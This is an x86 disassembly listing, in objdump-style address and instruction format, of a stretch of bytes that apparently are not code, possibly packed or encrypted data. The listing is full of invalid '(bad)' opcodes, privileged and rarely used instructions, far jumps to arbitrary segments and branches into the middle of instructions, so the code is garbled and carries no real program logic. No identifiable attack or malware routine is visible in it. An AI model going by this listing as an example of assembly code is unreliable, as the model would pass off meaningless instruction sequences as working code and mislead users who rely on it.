  40feda:	xabort 0x1c
  40fedd:	mov    eax,0x33e6b6ee
  40fee2:	data16 cmp ch,BYTE PTR [ebx-0x7cc6b06f]
  40fee9:	jl     0x40ff2c
  40feeb:	addr16 clc 
  40feed:	inc    esi
  40feee:	and    al,cl
  40fef0:	xor    esp,DWORD PTR [ebp-0x68]
  40fef3:	or     BYTE PTR [ebp+0x49],0x5b
  40fef7:	add    eax,0x810f2e00
  40fefc:	xchg   BYTE PTR [ecx+0x2c2b804],dl
  40ff02:	stc    
  40ff03:	xor    ebx,DWORD PTR [ebx-0x75]
  40ff06:	adc    al,dh
  40ff08:	outs   dx,BYTE PTR ds:[esi]
  40ff09:	ins    BYTE PTR es:[edi],dx
  40ff0a:	and    BYTE PTR [edx+eax*8+0x17a6ad97],ch
  40ff11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff13:	data16 mov bh,0xee
  40ff16:	mov    bh,0x17
  40ff18:	enter  0xeef5,0xfe
  40ff1c:	jg     0x40ff5f
  40ff1e:	mov    ah,BYTE PTR [eax-0xb59c4c5]
  40ff24:	je     0x40ff30
  40ff26:	leave  
  40ff27:	fcomip st,st(5)
  40ff29:	cs pushf 
  40ff2b:	mov    eax,0xf9c0b464
  40ff30:	ds jp  0x40fedc
  40ff33:	push   edi
  40ff34:	mov    ebx,0x879ae4a
  40ff39:	push   0xffffffba
  40ff3b:	xor    DWORD PTR [ebx-0x58],ecx
  40ff3e:	repz mov ecx,0xe9ad43ee
  40ff44:	add    eax,0xbc640fbf
  40ff49:	dec    edi
  40ff4a:	ins    BYTE PTR es:[edi],dx
  40ff4b:	ss xchg edi,eax
  40ff4d:	cmp    DWORD PTR [ecx-0x398eb4a0],ebp
  40ff53:	ror    dl,cl
  40ff55:	out    dx,al
  40ff56:	icebp  
  40ff57:	out    dx,al
  40ff58:	jmp    0x40ff78
  40ff5a:	push   esp
  40ff5b:	iret   
  40ff5c:	icebp  
  40ff5d:	dec    eax
  40ff5e:	mov    dh,BYTE PTR fs:[ecx+0x18346aa0]
  40ff65:	cld    
  40ff66:	mov    ebp,0x544844c2
  40ff6b:	int3   
  40ff6c:	push   DWORD PTR [eax-0x1125b907]
  40ff72:	ret    0xcdc3
  40ff75:	call   0x7e9fae4e
  40ff7a:	push   esi
  40ff7b:	(bad)  
  40ff7c:	xor    eax,0x73014a88
  40ff81:	cmp    DWORD PTR [ebx],ebp
  40ff83:	sar    BYTE PTR [ebp-0x59b6546b],1
  40ff89:	cdq    
  40ff8a:	sbb    al,0x0
  40ff8c:	cmp    al,bh
  40ff8e:	and    edi,ebx
  40ff90:	inc    edx
  40ff91:	adc    DWORD PTR [edx],ebx
  40ff93:	test   al,0x82
  40ff95:	ret    0xa448
  40ff98:	aaa    
  40ff99:	js     0x40ff56
  40ff9b:	aaa    
  40ff9c:	jge    0x40ff33
  40ff9e:	aas    
  40ff9f:	cmp    dl,ah
  40ffa1:	imul   esi,DWORD PTR [ebp-0x19],0xde0b308e
  40ffa8:	out    dx,eax
  40ffa9:	xchg   esp,eax
  40ffaa:	mov    bl,0xd2
  40ffac:	pop    ss
  40ffad:	mov    cs,WORD PTR [ecx+0x5d]
  40ffb0:	dec    esp
  40ffb1:	mov    ecx,0x1efaabb6
  40ffb6:	retf   
  40ffb7:	mov    eax,0x584882de
  40ffbc:	sub    eax,0x8e569775
  40ffc2:	and    al,BYTE PTR [edx-0x1b]
  40ffc5:	or     ebx,DWORD PTR [eax]
  40ffc7:	aam    0x13
  40ffc9:	outs   dx,BYTE PTR ds:[esi]
  40ffca:	fadd   QWORD PTR [ebx-0x230fd2ca]
  40ffd0:	xlat   BYTE PTR ds:[ebx]
  40ffd1:	cdq    
  40ffd2:	xchg   ebp,eax
  40ffd3:	sub    eax,DWORD PTR [eax-0x7b014f80]
  40ffd9:	fchs   
  40ffdb:	sub    eax,0xe01a328
  40ffe0:	and    BYTE PTR [edi-0x1f],dl
  40ffe3:	loope  0x410043
  40ffe5:	in     eax,dx
  40ffe6:	repz dec ebp
  40ffe8:	test   al,0x4d
  40ffea:	ds xchg edi,eax
  40ffec:	call   0x666f:0x96998da5
  40fff3:	inc    ebp
  40fff4:	jl     0x410031
  40fff6:	mov    WORD PTR [esi-0x5b6c4156],?
  40fffc:	imul   eax,DWORD PTR [ebp-0x44fad804],0xffffffe6
  410003:	push   esp
  410004:	mov    esp,0x84a9b7cc
  410009:	push   edx
  41000a:	lahf   
  41000b:	add    DWORD PTR [esi-0x7c],ebx
  41000e:	mov    cl,0x5c
  410010:	mov    eax,ds:0x259e4e68
  410015:	push   DWORD PTR [ebx]
  410017:	nop
  410018:	jecxz  0x410092
  41001a:	jecxz  0x40ffa8
  41001c:	sbb    DWORD PTR [esi-0x47581f2],eax
  410022:	ret    0x20ba
  410025:	pop    ebp
  410026:	test   BYTE PTR [edi+0x2d],cl
  410029:	(bad)  
  41002a:	js     0x40ffeb
  41002c:	retf   0xea03
  41002f:	cmp    dh,dl
  410031:	xor    DWORD PTR [ebp-0x67959029],ebx
  410037:	mov    bl,0x27
  410039:	cmp    DWORD PTR ds:0x501bf58d,ebp
  41003f:	shl    ebx,0xa8
  410042:	inc    eax
  410043:	icebp  
  410044:	dec    ebp
  410045:	shr    BYTE PTR [edi],cl
  410047:	push   cs
  410048:	jle    0x410090
  41004a:	jae    0x410032
  41004c:	daa    
  41004d:	push   ebp
  41004e:	retf   
  41004f:	mov    bl,0xd7
  410051:	test   DWORD PTR [edi-0x3b383be1],edx
  410057:	ret    
  410058:	jp     0x40fff2
  41005a:	call   0x7eff:0x489762f3
  410061:	dec    edx
  410062:	inc    ecx
  410063:	or     DWORD PTR [edx-0x29],esi
  410066:	(bad)  
  410067:	sub    al,0x2
  410069:	mov    ds:0x5958a2c8,eax
  41006e:	bound  edx,QWORD PTR [eax]
  410070:	scas   al,BYTE PTR es:[edi]
  410071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410072:	stc    
  410073:	jmp    0xd2cb:0x13707ca9
  41007a:	scas   eax,DWORD PTR es:[edi]
  41007b:	mov    ebp,0x444019bb
  410080:	cmp    eax,0x5402a4ad
  410085:	jmp    0xa915b71a
  41008a:	es int3 
  41008c:	lea    ebp,[ecx-0x5f]
  41008f:	sbb    esi,esp
  410091:	or     al,0x51
  410093:	fisubr WORD PTR [esi]
  410095:	shl    BYTE PTR [ecx-0x5c],0xb
  410099:	sbb    cl,BYTE PTR [edx+edi*2-0x4f4a9eed]
  4100a0:	xchg   esp,eax
  4100a1:	repz jbe 0x41003d
  4100a4:	dec    edi
  4100a5:	cmp    al,0xa6
  4100a7:	xchg   ecx,eax
  4100a8:	pop    es
  4100a9:	lea    edx,[ebx]
  4100ab:	outs   dx,BYTE PTR ds:[esi]
  4100ac:	popf   
  4100ad:	imul   ebp,DWORD PTR [ebx-0x13],0xe4317267
  4100b4:	cmp    eax,0x26014a6e
  4100ba:	xor    bl,BYTE PTR [ebx+ecx*1]
  4100bd:	and    ecx,DWORD PTR [esi]
  4100bf:	mov    bh,0x46
  4100c1:	ds (bad) 
  4100c3:	aad    0x44
  4100c5:	mov    esp,0x9f97795e
  4100ca:	xor    al,0x58
  4100cc:	adc    DWORD PTR [esi-0x24390fe0],ebp
  4100d2:	xchg   ecx,eax
  4100d3:	pop    ebx
  4100d4:	ds int 0x7a
  4100d7:	in     al,0x93
  4100d9:	cmc    
  4100da:	inc    edx
  4100db:	mov    ebx,0x56c6dd92
  4100e0:	xchg   BYTE PTR [ecx-0x647ef67d],dh
  4100e6:	(bad)  
  4100e7:	fnstsw WORD PTR [esi+eax*2]
  4100ea:	aas    
  4100eb:	pushf  
  4100ec:	repnz sbb DWORD PTR [ebp+0x5f],ebp
  4100f0:	cmp    eax,0x99f71ce
  4100f5:	and    edi,edi
  4100f7:	push   esi
  4100f8:	inc    ebp
  4100f9:	or     eax,0x985f7e47
  4100fe:	and    eax,0x5e6e8c67
  410103:	(bad)  
  410104:	pop    ss
  410105:	pop    ds
  410106:	push   edi
  410107:	add    ah,bh
  410109:	fadd   st,st(4)
  41010b:	test   dl,ch
  41010d:	mov    ds:0xde118f02,eax
  410112:	adc    al,0xe8
  410114:	out    0x22,al
  410116:	sbb    ebx,DWORD PTR [ebp-0x6afc24a1]
  41011c:	aad    0xd
  41011e:	xchg   esi,eax
  41011f:	imul   ecx,DWORD PTR [ebx+ebx*8+0x5e],0xb509849
  410127:	or     al,0x9f
  410129:	mov    ecx,0x3c61d4a9
  41012e:	addr16 sbb al,0x5e
  410131:	and    esi,DWORD PTR [eax-0x27f972de]
  410137:	fwait
  410138:	mul    ebp
  41013a:	in     al,dx
  41013b:	in     al,0x8f
  41013d:	(bad)  
  41013e:	pushf  
  41013f:	adc    al,0x83
  410141:	xor    al,0x1a
  410143:	(bad)  
  410144:	daa    
  410145:	mov    ecx,DWORD PTR [esi+eiz*1]
  410148:	pop    ecx
  410149:	enter  0x7591,0xf3
  41014d:	xor    DWORD PTR [ebp*2-0x7af5db66],edi
  410154:	popa   
  410155:	sub    DWORD PTR [ecx],edx
  410157:	push   edi
  410158:	call   0x137c:0x18cc398
  41015f:	in     eax,0xe7
  410161:	push   es
  410162:	rol    DWORD PTR [ebx],0x89
  410165:	and    ch,BYTE PTR [edx]
  410167:	or     DWORD PTR [ebp-0x16],ebx
  41016a:	adc    DWORD PTR [ecx+0x52ca8ffc],ebp
  410170:	push   esp
  410171:	ds cmc 
  410173:	fsubr  st(0),st
  410175:	pop    edi
  410176:	jl     0x4101ae
  410178:	adc    eax,DWORD PTR [edx+0x120ddd8f]
  41017e:	js     0x4101b6
  410180:	lock xor ch,al
  410183:	xor    BYTE PTR [edx],bl
  410185:	das    
  410186:	push   ebp
  410187:	out    0xba,eax
  410189:	aam    0xf8
  41018b:	fsubr  DWORD PTR [edx-0x5a81fd8]
  410191:	hlt    
  410192:	or     al,0x5a
  410194:	push   0x1b
  410196:	test   ebx,ecx
  410198:	popf   
  410199:	wbinvd 
  41019b:	repnz (bad) 
  41019d:	retf   
  41019e:	and    eax,0x47b35c56
  4101a3:	ret    
  4101a4:	or     BYTE PTR [edi-0x161c642b],0x51
  4101ab:	add    dh,BYTE PTR [ebp-0x7]
  4101ae:	pushf  
  4101af:	ss inc edi
  4101b1:	xchg   esp,eax
  4101b2:	ficom  DWORD PTR [edx+eiz*2-0x4cf96af]
  4101b9:	les    esp,FWORD PTR [ebp-0x66]
  4101bc:	loop   0x410210
  4101be:	and    cl,0x91
  4101c1:	mov    cl,0xfe
  4101c3:	mov    ch,0x30
  4101c5:	push   ebp
  4101c6:	adc    DWORD PTR [edi-0x76abaf25],ebp
  4101cc:	sub    ebx,ebx
  4101ce:	push   eax
  4101cf:	mov    bh,BYTE PTR [ecx]
  4101d1:	fcmovb st,st(6)
  4101d3:	jle    0x41019b
  4101d5:	ins    DWORD PTR es:[edi],dx
  4101d6:	add    al,0x56
  4101d8:	cdq    
  4101d9:	test   eax,0xf22fcb62
  4101de:	gs retf 
  4101e0:	lods   al,BYTE PTR ds:[esi]
  4101e1:	(bad)  
  4101e2:	pop    ds
  4101e3:	sar    BYTE PTR [esi-0x47cce372],1
  4101e9:	int3   
  4101ea:	add    eax,0x1bb75661
  4101ef:	and    eax,0x98074c36
  4101f4:	scas   al,BYTE PTR es:[edi]
  4101f5:	mov    edx,0x5e262b3
  4101fa:	or     ebx,eax
  4101fc:	push   ecx
  4101fd:	and    DWORD PTR [ebx],ebp
  4101ff:	and    BYTE PTR [ebx+0x25bde7b6],bh
  410205:	fisttp QWORD PTR [edi-0x23]
  410208:	sub    esp,esi
  41020a:	sbb    DWORD PTR [eax+0x5d560af6],ebx
  410210:	adc    edx,ebp
  410212:	xlat   BYTE PTR ds:[ebx]
  410213:	ret    0x60ed
  410216:	jnp    0x410250
  410218:	addr16 test al,0xa0
  41021b:	mov    ecx,DWORD PTR [ebx+0x3c]
  41021e:	and    BYTE PTR ds:0xba761700,dh
  410224:	mov    eax,DWORD PTR [ecx+0x29]
  410227:	lahf   
  410228:	loope  0x41024a
  41022a:	in     al,dx
  41022b:	add    BYTE PTR [edi],bh
  41022d:	xchg   esp,eax
  41022e:	imul   eax,DWORD PTR ds:0x43f6336a,0x7e
  410235:	mov    esp,0x92b72743
  41023a:	int    0x28
  41023c:	push   esp
  41023d:	icebp  
  41023e:	idiv   esi
  410240:	inc    eax
  410241:	xchg   ebp,eax
  410242:	sub    DWORD PTR [esi-0x11],edi
  410245:	pop    ecx
  410246:	push   es
  410247:	add    DWORD PTR [ebx],eax
  410249:	mov    al,0x6a
  41024b:	pop    edx
  41024c:	dec    eax
  41024d:	lock cmp ch,BYTE PTR [ecx]
  410250:	mov    ch,0x28
  410252:	lods   eax,DWORD PTR cs:[esi]
  410254:	and    ah,bl
  410256:	pop    edi
  410257:	mov    ecx,DWORD PTR [ebx]
  410259:	inc    ecx
  41025a:	cmp    al,0x62
  41025c:	xchg   edx,eax
  41025d:	out    0xe2,eax
  41025f:	xor    al,0x44
  410261:	mov    WORD PTR [edi],ds
  410263:	mov    dl,0xeb
  410265:	add    eax,0x1bb6fd66
  41026a:	mov    edi,0xacd35af0
  41026f:	mov    ds:0x9520286f,al
  410274:	mov    ds:0x23b3912f,al
  410279:	inc    ecx
  41027a:	push   esp
  41027b:	outs   dx,BYTE PTR ds:[esi]
  41027c:	mov    ebp,0x2b70e4cc
  410281:	mov    ds:0x6b9f0dc4,al
  410286:	pop    eax
  410287:	cmp    BYTE PTR [ecx],ch
  410289:	mov    edi,0x752b45c2
  41028e:	xchg   esp,eax
  41028f:	retf   0xe5b2
  410292:	or     eax,0xcf33792a
  410297:	ret    0x8671
  41029a:	cli    
  41029b:	add    al,0xea
  41029d:	sbb    DWORD PTR [esp+eax*8],esp
  4102a0:	das    
  4102a1:	(bad)  
  4102a2:	enter  0x3ee4,0x8b
  4102a6:	jnp    0x4102e6
  4102a8:	das    
  4102a9:	mov    WORD PTR [edx+0x421c54af],cs
  4102af:	ins    BYTE PTR es:[edi],dx
  4102b0:	shl    DWORD PTR [esi+0x75],0x43
  4102b4:	xor    al,0x7
  4102b6:	add    ecx,edi
  4102b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102b9:	sbb    DWORD PTR [ebx],edi
  4102bb:	push   esi
  4102bc:	jae    0x41025e
  4102be:	scas   al,BYTE PTR es:[edi]
  4102bf:	(bad)  
  4102c0:	out    dx,al
  4102c1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c3:	sub    bh,cl
  4102c5:	xchg   edx,eax
  4102c6:	xchg   ebx,eax
  4102c7:	pop    ecx
  4102c8:	cmc    
  4102c9:	sub    DWORD PTR [edx],esi
  4102cb:	push   ebx
  4102cc:	or     cl,dh
  4102ce:	mov    ds:0x9aecb6d5,eax
  4102d3:	jno    0x410301
  4102d5:	lds    ebp,FWORD PTR [esi+0x3f01dd9b]
  4102db:	inc    ebx
  4102dc:	pop    ebp
  4102dd:	inc    edx
  4102de:	and    al,0xe0
  4102e0:	sbb    al,0xc8
  4102e2:	arpl   si,sp
  4102e4:	xchg   ebx,eax
  4102e5:	ins    BYTE PTR es:[edi],dx
  4102e6:	xor    eax,0xe37b83cf
  4102eb:	and    BYTE PTR [ebp+0x78],dh
  4102ee:	int3   
  4102ef:	push   edx
  4102f0:	test   DWORD PTR [ebx+ecx*2-0x56ce5f6b],ebx
  4102f7:	push   ecx
  4102f8:	lahf   
  4102f9:	(bad)  
  4102fa:	mov    dl,0x5
  4102fc:	es push es
  4102fe:	js     0x41028f
  410300:	cmp    al,0x94
  410302:	nop
  410303:	inc    edx
  410304:	pop    eax
  410305:	cmp    ch,0xed
  410308:	arpl   WORD PTR [ebx],cx
  41030a:	push   edi
  41030b:	fsubr  DWORD PTR [edx+0x28]
  41030e:	add    al,0xad
  410310:	(bad)  
  410311:	ja     0x410383
  410313:	fnstenv [edi+eax*1]
  410316:	sbb    dh,ah
  410318:	adc    al,0x64
  41031a:	out    0xd5,al
  41031c:	and    bh,BYTE PTR [esi+eiz*1-0x335d7bfd]
  410323:	add    eax,0x5649cf1e
  410328:	int    0x36
  41032a:	add    eax,0x83b70b17
  41032f:	outs   dx,BYTE PTR ds:[esi]
  410330:	fldenv [esi]
  410332:	push   0xffffff85
  410334:	mov    ds:0xf29cf50a,eax
  410339:	cmp    ch,bh
  41033b:	push   edi
  41033c:	xchg   esi,eax
  41033d:	cli    
  41033e:	mov    ebp,0x21b093f6
  410343:	sbb    al,0xef
  410345:	xchg   ecx,eax
  410346:	inc    esi
  410347:	xor    cl,dl
  410349:	pop    ebp
  41034a:	xchg   edx,eax
  41034b:	jo     0x4103bd
  41034d:	or     DWORD PTR [eax-0x30b745a3],0xffffffc6
  410354:	xlat   BYTE PTR ds:[ebx]
  410355:	jo     0x410356
  410357:	stos   BYTE PTR es:[edi],al
  410358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410359:	sbb    esi,esp
  41035b:	test   al,0xc6
  41035d:	xor    al,0x3f
  41035f:	dec    edi
  410360:	ret    0x48cc
  410363:	and    esi,DWORD PTR [ebx]
  410365:	mov    eax,ds:0x81881cfb
  41036a:	cmp    edx,DWORD PTR [ebp+0x5c16c325]
  410370:	scas   eax,DWORD PTR es:[edi]
  410371:	jno    0x410376
  410373:	mov    esi,DWORD PTR [esi]
  410375:	test   BYTE PTR [edx-0x50299d3a],dl
  41037b:	out    0xf0,al
  41037d:	or     al,0xa1
  41037f:	add    eax,0x6793cbf2
  410384:	jmp    0x5cb6:0xc9e20e3e
  41038b:	lea    edi,[ecx+0x5e1cb4a3]
  410391:	cmp    eax,0xfffffff3
  410394:	out    0x40,al
  410396:	pop    ds
  410397:	ja     0x410366
  410399:	inc    eax
  41039a:	jbe    0x410366
  41039c:	imul   esp,DWORD PTR [edx],0x5299731d
  4103a2:	jg     0x410411
  4103a4:	imul   esi,DWORD PTR [ebx],0xfffffff7
  4103a7:	cmp    al,0xe6
  4103a9:	cmp    ah,bl
  4103ab:	mov    ecx,0xfbec8dfb
  4103b0:	pusha  
  4103b1:	jmp    0xa073b417
  4103b6:	iret   
  4103b7:	adc    ch,bh
  4103b9:	out    0x96,al
  4103bb:	jl     0x4103f4
  4103bd:	je     0x41041b
  4103bf:	mov    dh,0x82
  4103c1:	retf   
  4103c2:	je     0x41040a
  4103c4:	lods   al,BYTE PTR ds:[esi]
  4103c5:	lods   al,BYTE PTR ds:[esi]
  4103c6:	popf   
  4103c7:	(bad)  
  4103c8:	mov    al,ds:0xbbb50d0b
  4103cd:	dec    ecx
  4103ce:	mov    cl,0xa4
  4103d0:	ret    0x8851
  4103d3:	(bad)  
  4103d4:	push   edx
  4103d5:	xchg   edi,eax
  4103d6:	es pop ecx
  4103d8:	dec    eax
  4103d9:	push   esi
  4103da:	mul    DWORD PTR [eax+0x3e]
  4103dd:	mov    al,0xe8
  4103df:	or     DWORD PTR [edi+0x78ccacb4],esp
  4103e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103e6:	jne    0x4103db
  4103e8:	adc    dh,BYTE PTR [ebp+0x78d8d94c]
  4103ee:	aam    0x4b
  4103f0:	adc    eax,0xeef602cb
  4103f5:	mov    WORD PTR [edi+esi*1-0x22],cs
  4103f9:	es dec ecx
  4103fb:	add    esi,ebp
  4103fd:	je     0x41041e
  4103ff:	loop   0x410393
  410401:	sub    al,BYTE PTR [edi+0x48]
  410404:	fs jne 0x4103e6
  410407:	or     dh,dl
  410409:	shl    DWORD PTR [ecx-0x37],cl
  41040c:	and    BYTE PTR [edx+0x7a],bh
  41040f:	arpl   WORD PTR [eax-0x5b],si
  410412:	cdq    
  410413:	push   edx
  410414:	enter  0x9094,0xe7
  410418:	push   es
  410419:	sub    BYTE PTR [ebx+0x22],cl
  41041c:	jne    0x410416
  41041e:	pop    DWORD PTR [ebx+0x40]
  410421:	call   0xfc5585df
  410426:	sbb    BYTE PTR [eax],dl
  410428:	sub    al,0x91
  41042a:	and    dl,BYTE PTR [edx+0x53]
  41042d:	adc    eax,0x4b63c0ec
  410432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410433:	into   
  410434:	mov    ds:0x5e1f223,al
  410439:	pop    ebx
  41043a:	les    edi,FWORD PTR [edx]
  41043c:	adc    dl,BYTE PTR [edi-0x18]
  41043f:	mov    edi,0x74e0e64a
  410444:	leave  
  410445:	pop    esi
  410446:	jp     0x410416
  410448:	mov    ds:0xae7b678e,eax
  41044d:	and    BYTE PTR [edx],ch
  41044f:	imul   esp,esi,0x11
  410452:	pop    ecx
  410453:	push   ebp
  410454:	sahf   
  410455:	sbb    edx,DWORD PTR [eax+0x2f]
  410458:	dec    di
  41045a:	xor    al,0x79
  41045c:	sub    eax,DWORD PTR [esi-0x1a8cb64f]
  410462:	xor    DWORD PTR [ebx-0x4],ecx
  410465:	shl    DWORD PTR [edx-0x64089d4a],0x89
  41046c:	(bad)  
  41046d:	scas   eax,DWORD PTR es:[edi]
  41046e:	mov    al,0x40
  410470:	aad    0x15
  410472:	mov    eax,ds:0x80a183d9
  410477:	jp     0x410442
  410479:	(bad)  
  41047a:	xor    ecx,DWORD PTR [esi-0x1c9bbfa8]
  410480:	xlat   BYTE PTR ds:[ebx]
  410481:	stc    
  410482:	in     al,0x87
  410484:	dec    esp
  410485:	jecxz  0x41042d
  410487:	rcl    BYTE PTR [ebp-0x570165db],0x36
  41048e:	xchg   edx,eax
  41048f:	xlat   BYTE PTR ds:[ebx]
  410490:	fxch   st(3)
  410492:	add    BYTE PTR [eax],0x8c
  410495:	or     eax,DWORD PTR [ebx+0x77459d02]
  41049b:	xchg   edx,eax
  41049c:	pop    esp
  41049d:	mov    dl,0x6b
  41049f:	aaa    
  4104a0:	lahf   
  4104a1:	add    cl,BYTE PTR [ebx+esi*8-0x18]
  4104a5:	mov    ds:0x8a09a5f1,eax
  4104aa:	test   eax,0x58d5a93f
  4104af:	gs inc edx
  4104b1:	fdivrp st(3),st
  4104b3:	cmp    DWORD PTR [ebp-0x4e],0x8bba92fa
  4104ba:	bound  esp,QWORD PTR [ebx]
  4104bc:	mov    edi,0xe3af12f6
  4104c1:	cmp    BYTE PTR [eax-0xe],bh
  4104c4:	push   edi
  4104c5:	cmp    al,BYTE PTR [edi]
  4104c7:	retf   0x7ea0
  4104ca:	xchg   esi,eax
  4104cb:	mov    al,0x25
  4104cd:	jmp    0x7e44f9ab
  4104d2:	stos   DWORD PTR es:[edi],eax
  4104d3:	cmp    al,0x7b
  4104d5:	xchg   edi,eax
  4104d6:	lea    ebp,[eax+ebp*1-0x5de2cbe8]
  4104dd:	aaa    
  4104de:	adc    BYTE PTR [eax-0x62],bh
  4104e1:	icebp  
  4104e2:	inc    eax
  4104e3:	aad    0x1e
  4104e5:	xlat   BYTE PTR ds:[ebx]
  4104e6:	in     al,0x95
  4104e8:	inc    edx
  4104e9:	pop    ebx
  4104ea:	mov    cl,0x21
  4104ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104ed:	lods   eax,DWORD PTR ds:[esi]
  4104ee:	in     eax,dx
  4104ef:	cmp    ch,BYTE PTR [esi-0x72e0505f]
  4104f5:	imul   eax,DWORD PTR [esi+edi*2+0xc],0xd8bf8f5d
  4104fd:	push   ss
  4104fe:	icebp  
  4104ff:	gs jmp 0xd0cb6d21
  410505:	mov    bh,0xf1
  410507:	ss jmp 0x41054c
  41050a:	ja     0x4104c1
  41050c:	sbb    edi,ebx
  41050e:	cli    
  41050f:	std    
  410510:	imul   BYTE PTR [ebx-0x26f28e0d]
  410516:	idiv   DWORD PTR [ebp-0x337c9de3]
  41051c:	jae    0x4104fb
  41051e:	push   edi
  41051f:	pop    ebp
  410520:	mov    ebp,0x57c54fdc
  410525:	cdq    
  410526:	pushf  
  410527:	sub    ch,BYTE PTR [ecx]
  410529:	loope  0x4104d6
  41052b:	xor    eax,ebp
  41052d:	push   ebx
  41052e:	cmp    al,0xbe
  410530:	ja     0x410565
  410532:	jmp    0xfe93:0xad412da
  410539:	mov    ah,0xf3
  41053b:	add    ebp,DWORD PTR [edi-0x519760c1]
  410541:	arpl   di,ax
  410543:	sbb    dl,BYTE PTR [ebx-0x17052d42]
  410549:	test   al,0x2d
  41054b:	jb     0x41054d
  41054d:	xor    edx,DWORD PTR [edi]
  41054f:	lods   al,BYTE PTR ds:[esi]
  410550:	bound  esi,QWORD PTR [ecx]
  410552:	cmp    DWORD PTR [edi*1+0x236b54de],ebp
  410559:	mov    ch,0x7f
  41055b:	inc    eax
  41055c:	retf   0x2ec4
  41055f:	adc    al,BYTE PTR [ebx+0x7726fa24]
  410565:	icebp  
  410566:	push   ebx
  410567:	sbb    DWORD PTR [edi-0x2d],esp
  41056a:	add    edx,ebx
  41056c:	jne    0x410507
  41056e:	in     eax,dx
  41056f:	mov    bh,0x14
  410571:	jmp    0x36a08de0
  410576:	scas   eax,DWORD PTR es:[edi]
  410577:	sub    dh,BYTE PTR [ebx-0x1c]
  41057a:	mov    dl,0x95
  41057c:	mov    ds,WORD PTR [eax+0x3a]
  41057f:	shr    BYTE PTR [edx-0x20e67ca0],1
  410585:	mov    ebp,0x3a8386b0
  41058a:	push   ecx
  41058c:	jle    0x4105aa
  41058e:	mov    bl,0xbf
  410590:	mov    ds:0xbf195b18,eax
  410595:	mov    ah,0x65
  410597:	ror    DWORD PTR [ebx+0x14],cl
  41059a:	dec    eax
  41059b:	xchg   edx,eax
  41059c:	cmp    eax,0xbda2be29
  4105a1:	in     eax,0xb
  4105a3:	xchg   ecx,eax
  4105a4:	adc    eax,0x4e1f65f
  4105a9:	aam    0x53
  4105ab:	mov    DWORD PTR [ebx+0x63],eax
  4105ae:	into   
  4105af:	pop    ebp
  4105b0:	fdivp  st(4),st
  4105b2:	jecxz  0x41058a
  4105b4:	mov    cl,0x79
  4105b6:	push   es
  4105b7:	jmp    0xeb9ff5ed
  4105bc:	push   edi
  4105bd:	(bad)  
  4105be:	mov    bl,0xe0
  4105c0:	jg     0x41063f
  4105c2:	jo     0x41057d
  4105c4:	cmp    DWORD PTR [eax],edi
  4105c6:	sbb    al,BYTE PTR [ebp+0x57]
  4105c9:	xchg   BYTE PTR [ebx],dh
  4105cb:	and    al,0x9c
  4105cd:	out    dx,al
  4105ce:	aas    
  4105cf:	test   BYTE PTR ds:0x2d5ac00c,bl
  4105d5:	or     DWORD PTR [edi-0x2cf8fcdf],esp
  4105db:	sbb    BYTE PTR [ecx],bh
  4105dd:	mov    ch,dl
  4105df:	jmp    0x1507:0x4ebf3646
  4105e6:	and    al,0xeb
  4105e8:	test   BYTE PTR es:0x3f908595,ah
  4105ef:	cld    
  4105f0:	xchg   ecx,eax
  4105f1:	push   DWORD PTR [ebx+0x53d344f8]
  4105f7:	xor    BYTE PTR [ebx+edx*1],bl
  4105fa:	push   esp
  4105fb:	push   cs
  4105fc:	lock fidiv DWORD PTR [edi-0x7b]
  410600:	aaa    
  410601:	inc    esp
  410602:	fcmove st,st(2)
  410604:	push   eax
  410605:	ss sub al,0x63
  410608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410609:	inc    eax
  41060a:	adc    cl,BYTE PTR [ecx+0x3e]
  41060d:	lds    ebp,FWORD PTR [ebx]
  41060f:	shl    DWORD PTR [esi+0x469396b6],cl
  410615:	sbb    bh,al
  410617:	test   ebx,ebx
  410619:	push   esp
  41061a:	mov    ah,0x1d
  41061c:	add    BYTE PTR [ebx-0x10],cl
  41061f:	pop    ecx
  410620:	dec    ecx
  410621:	ds (bad) 
  410624:	stc    
  410625:	add    DWORD PTR [edi-0x2350de23],0xffffff9c
  41062c:	outs   dx,BYTE PTR ds:[esi]
  41062d:	pushf  
  41062e:	xchg   ebp,eax
  41062f:	outs   dx,BYTE PTR ds:[esi]
  410630:	sti    
  410631:	mov    dh,0x96
  410633:	fld    TBYTE PTR [esp+eiz*8-0x18]
  410637:	pop    esi
  410638:	fs pop esp
  41063a:	pushf  
  41063b:	test   al,0x2b
  41063d:	cld    
  41063e:	pop    ds
  41063f:	push   ds
  410640:	mov    al,ds:0xe9e9325a
  410645:	bound  esp,QWORD PTR ds:0x4df50d1b
  41064b:	push   0xffffffe8
  41064d:	mov    ah,0x4f
  41064f:	dec    eax
  410650:	mov    ebx,DWORD PTR [ebx]
  410652:	repnz mov al,0x95
  410655:	push   esi
  410656:	into   
  410657:	dec    DWORD PTR [edx+0x5651b038]
  41065d:	pop    edi
  41065e:	shl    BYTE PTR [ebp+0x51444ea2],1
  410664:	int    0x89
  410666:	xlat   BYTE PTR ds:[ebx]
  410667:	xor    ebp,edx
  410669:	enter  0xae97,0x42
  41066d:	jb     0x4106cd
  41066f:	push   ds
  410670:	(bad)  
  410672:	add    bl,BYTE PTR [eax-0x4e]
  410675:	inc    esp
  410676:	xchg   ebp,eax
  410677:	mov    cl,0xe6
  410679:	mov    al,0xd7
  41067b:	outs   dx,BYTE PTR ds:[esi]
  41067c:	enter  0x560f,0xc4
  410680:	ss push esi
  410682:	pushf  
  410683:	retf   
  410684:	jnp    0x4106ed
  410686:	out    dx,al
  410687:	add    al,0x6e
  410689:	mov    BYTE PTR [esi+ebx*1-0x2f38ef0f],0xa0
  410691:	mov    ecx,0x1cb5e521
  410696:	xchg   ebx,eax
  410697:	cmc    
  410698:	mov    ebp,0x363f2485
  41069d:	inc    esi
  41069e:	in     al,dx
  41069f:	sbb    edx,DWORD PTR [esi+0x45acc5d2]
  4106a5:	fnstenv [ebp+ebx*1-0x6bd1bb63]
  4106ac:	and    al,0xe
  4106ae:	shl    DWORD PTR [esi+0x68],1
